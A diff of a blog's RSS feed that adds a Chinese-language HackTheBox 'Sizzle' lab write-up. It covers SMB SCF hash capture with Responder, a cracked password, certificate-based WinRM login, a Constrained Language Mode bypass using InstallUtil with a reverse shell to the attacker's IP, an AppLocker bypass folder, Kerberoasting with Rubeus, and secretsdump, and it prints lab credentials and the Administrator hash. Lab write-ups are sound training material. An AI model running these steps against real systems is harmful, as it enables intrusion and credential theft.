@@ -7,13 +7,362 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Example Person</copyright>
-        <lastBuildDate>Sat, 29 Mar 2025 13:37:44 +0800</lastBuildDate><atom:link href="https://nergigantes.github.io/categories/%E5%9F%9F/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 31 Mar 2025 20:25:29 +0800</lastBuildDate><atom:link href="https://nergigantes.github.io/categories/%E5%9F%9F/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Sizzle</title>
+        <link>https://nergigantes.github.io/htb/sizzle/</link>
+        <pubDate>Mon, 31 Mar 2025 20:24:47 +0800</pubDate>
+        
+        <guid>https://nergigantes.github.io/htb/sizzle/</guid>
+        <description>&lt;img src="https://nergigantes.github.io/19.jpg" alt="Featured image of post Sizzle" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d.png&#34;
+	width=&#34;1165&#34;
+	height=&#34;857&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d_hua53212d7a771bf6914723eedc334f6ed_411213_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743335703330-be6d977a-4d0b-45a4-a2b7-f2c2d861b36d_hua53212d7a771bf6914723eedc334f6ed_411213_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;135&#34;
+		data-flex-basis=&#34;326px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;域名：HTB.LOCAL&lt;/p&gt;
+&lt;p&gt;smb逐一枚举，没用扫到用户，但是能以guest的用户并且允许了空密码查看一些共享文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nxc smb 10.10.10.103 -u &amp;#39;guest&amp;#39; -p &amp;#39;&amp;#39; --shares
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b.png&#34;
+	width=&#34;1222&#34;
+	height=&#34;506&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b_hua5ba370b7f98ab263c8b448f224cc446_294219_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743335758517-a8e21c28-6afd-4f42-839d-a95952cf568b_hua5ba370b7f98ab263c8b448f224cc446_294219_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;241&#34;
+		data-flex-basis=&#34;579px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;详细看看这俩个共享文件夹Department Shares IPC$&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;smbclient //10.10.10.103/&amp;#34;Department Shares&amp;#34; -U &amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;IPC$文件里没有东西，Department Shares文件夹里有，但是这样一看看不出什么东西来&lt;/p&gt;
+&lt;p&gt;看其他的大佬的wp后发现思路-寻找可写文件夹-发现有个user文件夹下会删除我们写的文件-&lt;/p&gt;
+&lt;p&gt;这个删除的行为相当于一次交互-利用这一点执行SCF 文件攻击&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;为了方便我们把smb共享目录挂载在本地上查看&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;mount -t cifs &amp;lt;共享路径&amp;gt; &amp;lt;挂载点&amp;gt; -o &amp;lt;选项&amp;gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);&#34;&gt;mount -t cifs -o rw,username=guest,password= &amp;lsquo;//10.10.10.103/Department Shares&amp;rsquo; /mnt&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;以读写模式挂载&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;查看能写的文件夹，这里不能用find命令去看，因为我们这个文件夹是挂载的，所以最好的办法就是写一个脚本一个一个文件夹创建文件来看看能不能写文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;list=$(find /mnt -type d)  # 查找 /mnt 及其子目录，返回目录列表
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;for d in $list              # 遍历每个目录
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;do
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    touch $d/x 2&amp;gt;/dev/null  # 尝试在该目录创建一个空文件 x，错误信息重定向到 /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    if [ $? -eq 0 ]         # 检查 touch 命令是否成功
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    then
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        echo $d &amp;#34; is writable&amp;#34;  # 输出可写目录
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    fi
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;done
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7.png&#34;
+	width=&#34;877&#34;
+	height=&#34;245&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7_hu9387f7eb6791f799ea5e6a56674c9bea_78903_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743338559785-12c7e91a-e06e-4b88-820b-69ddbeb567f7_hu9387f7eb6791f799ea5e6a56674c9bea_78903_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;357&#34;
+		data-flex-basis=&#34;859px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们能够在俩个文件夹下写&lt;/p&gt;
+&lt;p&gt;在public文件夹中写入我们的scf攻击文件&lt;/p&gt;
+&lt;p&gt;然后用responder开启smb服务并监听&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo responder -I tun0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;等待一会&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553.png&#34;
+	width=&#34;1208&#34;
+	height=&#34;370&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553_hu83df304482769e2b1f6f696b8331d811_389083_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743340350346-0c3ae0e6-c570-4f01-ae93-6f1b093aa553_hu83df304482769e2b1f6f696b8331d811_389083_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;326&#34;
+		data-flex-basis=&#34;783px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功拿到amanda用户的hash，爆破一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a.png&#34;
+	width=&#34;1204&#34;
+	height=&#34;252&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a_hu3ec23956479bf583af1594cb20b56505_124793_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743340433751-708dceb5-fbb4-4c34-91e6-f9edde8c702a_hu3ec23956479bf583af1594cb20b56505_124793_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;477&#34;
+		data-flex-basis=&#34;1146px&#34;
+	
+&gt;Ashare1972，现在我们就有了一组账号密码了&lt;/p&gt;
+&lt;p&gt;但是这个用户登陆不了&lt;/p&gt;
+&lt;p&gt;这里要回到信息收集的时候，那个网站能爆出一个目录，我们可以用这个账号密码登陆&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458.png&#34;
+	width=&#34;1167&#34;
+	height=&#34;662&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458_hu2ac9338722e70e541acfb304099c9a14_176791_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743401313516-129a5587-15f5-4756-8cb6-4f5aeeb44458_hu2ac9338722e70e541acfb304099c9a14_176791_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;176&#34;
+		data-flex-basis=&#34;423px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40.png&#34;
+	width=&#34;2869&#34;
+	height=&#34;1207&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40_hu00bfa9535525f3a16a37e76e639ed303_347511_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743401396208-e8e3cad9-cc45-4705-808c-9482b7a90b40_hu00bfa9535525f3a16a37e76e639ed303_347511_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;237&#34;
+		data-flex-basis=&#34;570px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进来后发现这里是一个可以搓证书的地方&lt;/p&gt;
+&lt;p&gt;openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr&lt;/p&gt;
+&lt;p&gt;先搓一个amanda.csr出来，然后拿里面的码去生成我们需要的证书&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56.png&#34;
+	width=&#34;2592&#34;
+	height=&#34;955&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56_hu627a64cfdf3543b1810982c6b1dda835_180160_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743404017624-a5ef7316-830f-4460-874a-9244bb4cea56_hu627a64cfdf3543b1810982c6b1dda835_180160_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;271&#34;
+		data-flex-basis=&#34;651px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;最后使用证书和key登陆&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u &#39;amanda&#39; -p &#39;Ashare1972&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;上去之后上传SharpHound.exe分析一下情况，但是上传报错，那就使用Houndblood-python去扫一下&lt;/p&gt;
+&lt;p&gt;分析结果发现&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f.png&#34;
+	width=&#34;1275&#34;
+	height=&#34;992&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f_hu8fb3967cf61741b5d291641a77b4c9c8_134355_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743408629676-ee970be9-e521-4ede-8aca-ca4687705e0f_hu8fb3967cf61741b5d291641a77b4c9c8_134355_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;128&#34;
+		data-flex-basis=&#34;308px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;mrlky用户有很大的利用价值，不仅是因为他拥有对域的DCSync权限，还因为该账户被设置了SPN&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796.png&#34;
+	width=&#34;732&#34;
+	height=&#34;699&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796_hu63ea10f2a6c95511f29643c7924f62b8_55883_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743408703588-5cf65a29-8a8b-4890-abbd-f8361472d796_hu63ea10f2a6c95511f29643c7924f62b8_55883_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;104&#34;
+		data-flex-basis=&#34;251px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;那么接下来，就进行Kerberoasting攻击&lt;/p&gt;
+&lt;p&gt;但是尝试了几次都不行，那就换一个Kerberoasting攻击方法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20.png&#34;
+	width=&#34;1705&#34;
+	height=&#34;260&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20_hud34124d52620a1c104ce12031b53b1d6_98239_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743409254596-23e7034c-5f4b-4ee9-ab16-b77f54a1af20_hud34124d52620a1c104ce12031b53b1d6_98239_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;655&#34;
+		data-flex-basis=&#34;1573px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;了解到我们可以使用&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;Rubeus请求&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;但是我们目前无法上传文件，原因是现在是&lt;/font&gt;&lt;strong&gt;约束模式（Constrained Language Mode）&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;$ExecutionContext.SessionState.LanguageMode&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa.png&#34;
+	width=&#34;1192&#34;
+	height=&#34;111&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa_hu79bcf0b9dd3da4e96067e043a8145563_22956_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743409425394-de57dbc2-bb77-460f-a3a2-753ac488b6fa_hu79bcf0b9dd3da4e96067e043a8145563_22956_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1073&#34;
+		data-flex-basis=&#34;2577px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;因此现在我们该突破这个约束&lt;/p&gt;
+&lt;p&gt;选择利用PSByPassCLM&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);&#34;&gt;iwr -uri http://10.10.16.21:5001/PsBypassCLM.exe -outfile PsBypassCLM.exe&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(89, 89, 89);background-color:rgb(248, 248, 248);&#34;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.16.21 /rport=2333 C:\Users\amanda\Documents\PsBypassCLM.exe&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3.png&#34;
+	width=&#34;1705&#34;
+	height=&#34;918&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3_huc2ac997cf33c241ec0757dcb2d837a26_231122_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743410137482-218d3761-2acb-4b00-a31a-a8cef88ec9b3_huc2ac997cf33c241ec0757dcb2d837a26_231122_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;445px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;现在我们就拥有了一个不被限制的shell了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92.png&#34;
+	width=&#34;1949&#34;
+	height=&#34;459&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92_hufcf223b559460976c0b0add2f852fbab_117993_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743410192391-e09ecaba-bf2f-4839-8d85-0d3792064d92_hufcf223b559460976c0b0add2f852fbab_117993_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;424&#34;
+		data-flex-basis=&#34;1019px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;现在将Rubeus文件上传,执行&lt;/p&gt;
+&lt;p&gt;.\rubeus.exe kerberoast /creduser:&lt;strong&gt;htb.local&lt;/strong&gt;*&lt;em&gt;amanda&lt;/em&gt;* /credpassword:&lt;strong&gt;Ashare1972&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;又有问题了，rubeus文件被系统ban了&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;AppLocker 或 Windows Defender Application Control（WDAC）&lt;/strong&gt; 阻止了 Rubeus。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;被 Windows Defender 或其他安全工具检测为恶意软件&lt;/strong&gt;（基于特征码或路径）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;现在该想如何绕过这个限制&lt;/p&gt;
+&lt;p&gt;经了解，可以将文件放置在这些文件夹的话，就可以执行&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae.png&#34;
+	width=&#34;1321&#34;
+	height=&#34;1034&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae_hu9eefd145a3edb123b5c1ae82799dc8ef_123750_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743412389796-9582c45d-8a48-46d8-89ae-b55f3a44b1ae_hu9eefd145a3edb123b5c1ae82799dc8ef_123750_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;127&#34;
+		data-flex-basis=&#34;306px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;经测试，可以在&lt;/p&gt;
+&lt;p&gt;C:\Windows\System32\spool\drivers\color目录下绕过策略组执行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496.png&#34;
+	width=&#34;1561&#34;
+	height=&#34;1010&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496_hued1aeef4fc17cf36f84c28e151902b0c_289586_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743412432782-cc6929f2-d8c9-4d9d-9c84-2424eb16a496_hued1aeef4fc17cf36f84c28e151902b0c_289586_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;154&#34;
+		data-flex-basis=&#34;370px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功拿到mrlky用户的hash，上爆破！！&lt;/p&gt;
+&lt;p&gt;结果一直爆破不出来。。后来重新运行了一下结果能爆破出来了？而且俩次的hash值也不同&lt;/p&gt;
+&lt;p&gt;所以，这是为啥呢。。。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f.png&#34;
+	width=&#34;1977&#34;
+	height=&#34;685&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f_hu46b98b484e0d3396bca9a8ff39a85661_488879_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743414640169-4019fb80-d5e0-422c-b5b3-36763634879f_hu46b98b484e0d3396bca9a8ff39a85661_488879_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;288&#34;
+		data-flex-basis=&#34;692px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;不管怎么说，我们现在有了mrlky的账户&lt;/p&gt;
+&lt;p&gt;Football#7&lt;/p&gt;
+&lt;p&gt;是时候向着最后一步发起冲击了！&lt;/p&gt;
+&lt;p&gt;虽然evil登不了（应该是像amanda一样需要搓证书），但是我们已经拥有了mrlky账户密码，直接secretsdump倾倒出hash密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149.png&#34;
+	width=&#34;1267&#34;
+	height=&#34;519&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149_hu9aa79cf9eb30f09e732cb0bb2f636a7c_201970_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149_hu9aa79cf9eb30f09e732cb0bb2f636a7c_201970_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;244&#34;
+		data-flex-basis=&#34;585px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267&lt;/p&gt;
+&lt;p&gt;同样的administratot估计也登不了evil-winrm，但是我们还有其他交互shell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31.png&#34;
+	width=&#34;1415&#34;
+	height=&#34;299&#34;
+	srcset=&#34;https://nergigantes.github.io/htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31_hu46bfa70c214dc5c246942b0859a0f689_151427_480x0_resize_box_3.png 480w, https://nergigantes.github.io/htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31_hu46bfa70c214dc5c246942b0859a0f689_151427_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;473&#34;
+		data-flex-basis=&#34;1135px&#34;
+	
+&gt;&lt;/p&gt;
